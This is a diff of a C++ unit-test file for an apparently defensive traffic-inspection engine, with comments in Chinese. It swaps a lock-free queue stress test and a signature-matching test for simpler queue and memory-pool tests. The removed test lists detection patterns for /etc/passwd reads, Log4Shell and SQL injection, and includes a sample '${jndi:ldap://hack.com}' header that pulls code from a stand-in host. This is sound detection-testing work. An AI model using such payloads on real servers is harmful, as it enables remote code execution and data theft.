@@ -1,42 +1,35 @@
-// tests/test_core_engine.cpp
 #include <gtest/gtest.h>
+#include "common/queues/SPSCQueue.h"
+#include "common/memory/ObjectPool.h"
 #include <thread>
 #include <vector>
-#include <atomic>
-#include "common/queues/SPSCQueue.h"
-#include "engine/flow/AhoCorasick.h"
 
 using namespace sentinel::common;
-using namespace sentinel::engine;
 
-// ==========================================
-// 测试用例 1: SPSCQueue 无锁并发一致性测试
-// 验证极限多线程并发下，是否会丢数据或死锁
-// ==========================================
-TEST(SPSCQueueTest, ConcurrencyPushPop) {
-    SPSCQueue<int, 4096> queue;
-    const int TEST_COUNT = 500000; // 50万次压测
-    std::atomic<long long> sum_produced{0};
-    std::atomic<long long> sum_consumed{0};
+// 测试 1：SPSCQueue 无锁队列的高并发读写一致性
+TEST(SPSCQueueTest, ConcurrentPushPop) {
+    SPSCQueue<int> queue(1024);
+    const int num_items = 50000;
+    long long sum_pushed = 0;
+    long long sum_popped = 0;
 
-    // 生产者线程
     std::thread producer([&]() {
-        for (int i = 1; i <= TEST_COUNT; ++i) {
+        for (int i = 1; i <= num_items; ++i) {
             while (!queue.push(i)) {
-                std::this_thread::yield(); // 队列满则退避自旋
+                std::this_thread::yield(); // 队满则等待
             }
-            sum_produced += i;
+            sum_pushed += i;
         }
     });
 
-    // 消费者线程
     std::thread consumer([&]() {
-        int consumed_count = 0;
-        while (consumed_count < TEST_COUNT) {
-            auto valOpt = queue.popWait(std::chrono::milliseconds(10));
-            if (valOpt) {
-                sum_consumed += *valOpt;
-                consumed_count++;
+        for (int i = 1; i <= num_items; ++i) {
+            while (true) {
+                auto val = queue.popWait(std::chrono::milliseconds(10));
+                if (val) {
+                    sum_popped += *val;
+                    break;
+                }
             }
         }
     });
@@ -44,28 +37,34 @@ TEST(SPSCQueueTest, ConcurrencyPushPop) {
     producer.join();
     consumer.join();
 
-    EXPECT_EQ(sum_produced.load(), sum_consumed.load()) << "⚠️ 无锁队列发生数据丢失或错乱！";
+    // 验证所有生产的数据都被正确消费，没有丢失或错乱
+    EXPECT_EQ(sum_pushed, sum_popped);
+    EXPECT_EQ(queue.size(), 0);
 }
 
-// ==========================================
-// 测试用例 2: Aho-Corasick 自动机精确度测试
-// 验证 O(N) 状态机能否在复杂的流中精准定位 Payload
-// ==========================================
-TEST(AhoCorasickTest, ExactPatternMatching) {
-    AhoCorasick ac;
+// 测试 2：ObjectPool 内存池的复用机制
+TEST(ObjectPoolTest, AcquireAndRelease) {
+    ObjectPool<int> pool(10); // 预分配 10 个
+    
+    int* p1 = pool.acquire();
+    *p1 = 42;
+    EXPECT_NE(p1, nullptr);
 
-    // 注入模拟规则
-    ac.insert("GET /etc/passwd", 101);
-    ac.insert("${jndi:", 102);      // 你的 test1 规则
-    ac.insert("UNION SELECT", 103);
-    ac.build();
+    int* p2 = pool.acquire();
+    *p2 = 100;
+    EXPECT_NE(p1, p2);
 
-    std::string payload_str = "HTTP/1.1\r\nUser-Agent: ${jndi:ldap://hack.com}\r\nAccept: */*\r\n";
-    std::vector<uint8_t> payload(payload_str.begin(), payload_str.end());
+    pool.release(p1);
+    
+    // p3 应该完美复用 p1 刚刚释放的内存地址
+    int* p3 = pool.acquire();
+    EXPECT_EQ(p1, p3); 
+    
+    pool.release(p2);
+    pool.release(p3);
+}
 
-    const auto* hitRules = ac.match(payload);
-
-    ASSERT_NE(hitRules, nullptr) << "⚠️ 自动机未能检出恶意载荷！";
-    bool found = (std::find(hitRules->begin(), hitRules->end(), 102) != hitRules->end());
-    EXPECT_TRUE(found) << "⚠️ 自动机检出了错误的安全规则！";
+int main(int argc, char **argv) {
+    ::testing::InitGoogleTest(&argc, argv);
+    return RUN_ALL_TESTS();
 }
